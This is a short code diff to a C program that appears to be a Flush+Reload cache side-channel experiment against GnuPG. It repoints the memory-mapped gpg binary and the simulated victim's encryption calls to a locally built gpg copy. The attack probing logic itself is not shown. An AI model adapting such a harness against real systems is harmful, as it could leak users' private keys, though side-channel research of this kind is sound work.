@@ -22,7 +22,7 @@ uint64_t reload(void *addr) {
 }
 
 void *map_gnupg() {
-    int fd = open("/usr/bin/gpg", O_RDONLY);
+    int fd = open("/home/ev/genkin/flush_reload/gnupg-install/bin/gpg", O_RDONLY);
     if (fd == -1) {
         perror("open");
         return NULL;
@@ -65,7 +65,7 @@ void victim() {
     // Use GnuPG to encrypt (simplified - in real attack would call actual gpg)
     printf("Victim: Starting encryption on core 1\n");
     for (int i = 0; i < 5; i++) {
-        system("echo 'test message' | gpg --encrypt --recipient test@test.com 2>/dev/null");
+        system("echo 'test message' | /home/ev/genkin/flush_reload/gnupg-install/bin/gpg --encrypt --recipient test@test.com 2>/dev/null");
         usleep(500000);
     }
 }
